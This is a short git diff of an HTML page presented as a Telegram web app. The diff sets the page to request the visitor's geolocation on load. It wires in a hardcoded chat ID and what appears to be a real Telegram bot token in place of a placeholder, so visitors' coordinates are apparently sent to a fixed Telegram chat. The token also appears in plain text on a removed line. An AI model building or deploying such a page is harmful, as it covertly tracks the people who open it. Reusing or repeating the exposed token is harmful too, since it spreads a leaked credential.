@@ -77,7 +77,7 @@
     </style>
 </head>
 
-<body onload="sendLocation()">
+<body onload="getLocation()">
     <main>
         <div align="center">
             <a href="https://ton.org/"><img width="48" src="./assets/tapps.png" alt="logo of telegram web apps"></a>
@@ -155,7 +155,6 @@
         Telegram.WebApp.showAlert("Geolocation is not supported by this browser.");
     }
 }
-7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE
 function getLocation() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -175,7 +174,7 @@ function sendLocation(position) {
     }
 
     const chatId = "7265296083";  // Replace with actual chat ID
-    const botToken = "YOUR_BOT_TOKEN"; // Replace with your bot token
+    const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token
     const { latitude, longitude } = position.coords;
 
     console.log("Latitude:", latitude, "Longitude:", longitude);
